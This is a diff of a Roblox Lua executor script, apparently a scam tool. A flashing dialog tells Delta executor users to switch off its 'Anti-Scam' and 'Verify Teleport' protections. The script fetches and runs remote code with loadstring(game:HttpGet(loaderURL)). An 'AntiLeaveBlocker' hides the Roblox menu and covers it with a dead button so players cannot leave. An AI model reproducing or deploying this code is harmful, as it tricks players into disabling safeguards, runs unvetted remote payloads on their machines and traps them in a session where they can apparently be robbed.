@@ -32,9 +32,9 @@ if executor == "Delta" then
     screenGui.ResetOnSpawn = false
     screenGui.Parent = playerGui
 
-    -- Main Frame
+    -- Main Frame (fixed size + aspect ratio)
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0.65, 0, 0.4, 0)
+    frame.Size = UDim2.new(0, 500, 0, 250)
     frame.Position = UDim2.new(0.5, 0, 0.5, 0)
     frame.AnchorPoint = Vector2.new(0.5, 0.5)
     frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
@@ -49,14 +49,23 @@ if executor == "Delta" then
     stroke.Color = Color3.fromRGB(0, 170, 255)
     stroke.Thickness = 2
 
+    -- Para hindi stretch
+    local aspect = Instance.new("UIAspectRatioConstraint")
+    aspect.AspectRatio = 2 -- 500:250 ratio
+    aspect.Parent = frame
+
+    local sizeConstraint = Instance.new("UISizeConstraint")
+    sizeConstraint.MinSize = Vector2.new(400, 200)
+    sizeConstraint.MaxSize = Vector2.new(600, 300)
+    sizeConstraint.Parent = frame
+
     -- Warning Bar
     local warningBar = Instance.new("TextLabel")
     warningBar.Size = UDim2.new(1, 0, 0.15, 0)
     warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
     warningBar.TextColor3 = Color3.fromRGB(255, 221, 51)
-	warningBar.Text = [[Turn off your <u>Anti Scam</u> & <u>Verify Teleport</u> to avoid getting banned or disconnected.]]
-	warningBar.RichText = true
-
+    warningBar.Text = [[Turn off your <u>Anti Scam</u> & <u>Verify Teleport</u> to avoid getting banned or disconnected.]]
+    warningBar.RichText = true
     warningBar.TextSize = 14
     warningBar.Font = Enum.Font.GothamBold
     warningBar.TextWrapped = true
@@ -68,13 +77,13 @@ if executor == "Delta" then
     topCorner.CornerRadius = UDim.new(0, 16)
     topCorner.Parent = warningBar
 
-    -- **Fast Blinking Effect (Alert Style)**
+    -- Fast Blinking Effect
     task.spawn(function()
         while warningBar and warningBar.Parent do
             TweenService:Create(warningBar, TweenInfo.new(0.2), {BackgroundTransparency = 0.5, TextTransparency = 0.5}):Play()
-            wait(0.2)
+            task.wait(0.2)
             TweenService:Create(warningBar, TweenInfo.new(0.2), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
-            wait(0.2)
+            task.wait(0.2)
         end
     end)
 
@@ -103,17 +112,12 @@ if executor == "Delta" then
     desc.TextWrapped = true
     desc.TextXAlignment = Enum.TextXAlignment.Center
     desc.TextYAlignment = Enum.TextYAlignment.Center
-	desc.Text = [[
-The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>.
-
+    desc.Text = [[ The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>.
 1) Tap the Delta icon at the top.
 2) Open Settings (gear icon).
-3) Turn OFF the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option.
-4) Rejoin and run the script again.
-]]
-	desc.RichText = true
-
-
+3) Turn <font color="#FF0000">OFF</font> the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option.
+4) Rejoin and run the script again. ]]
+    desc.RichText = true
 
     -- Button Container
     local buttonContainer = Instance.new("Frame", frame)
@@ -121,7 +125,7 @@ The script requires teleport permission, which is currently blocked by Delta's <
     buttonContainer.Position = UDim2.new(0, 15, 0.8, 0)
     buttonContainer.BackgroundTransparency = 1
 
-    -- Click to open button
+    -- Open Button
     local openButton = Instance.new("TextButton", buttonContainer)
     openButton.Size = UDim2.new(0.48, 0, 1, 0)
     openButton.BackgroundColor3 = Color3.fromRGB(0, 115, 255)
@@ -158,12 +162,12 @@ else
     loadstring(game:HttpGet(loaderURL))()
 end
 
+-- ===== AntiLeave Blocker (original) =====
 pcall(function()
 	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
 		game.CoreGui.AntiLeaveBlocker:Destroy()
 	end
 end)
-
 
 local BLOCK_SIZE_X = 56
 local BLOCK_SIZE_Y = 56
@@ -171,10 +175,8 @@ local BLOCK_POS_X  = 6
 local BLOCK_POS_Y  = 6
 local DISPLAY_ORDER = 10000
 
-
 local CoreGui = game:GetService("CoreGui")
 local RunService = game:GetService("RunService")
-
 
 local function tryHideRobloxMenu()
 	pcall(function()
@@ -203,7 +205,6 @@ local function tryHideRobloxMenu()
 		end
 	end)
 end
-
 
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "AntiLeaveBlocker"
@@ -234,11 +235,9 @@ blocker.MouseButton1Up:Connect(function() end)
 blocker.MouseButton2Down:Connect(function() end)
 blocker.MouseButton2Up:Connect(function() end)
 
-
 RunService.RenderStepped:Connect(function()
 	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
 end)
-
 
 spawn(function()
 	while screenGui.Parent and screenGui.Parent == CoreGui do
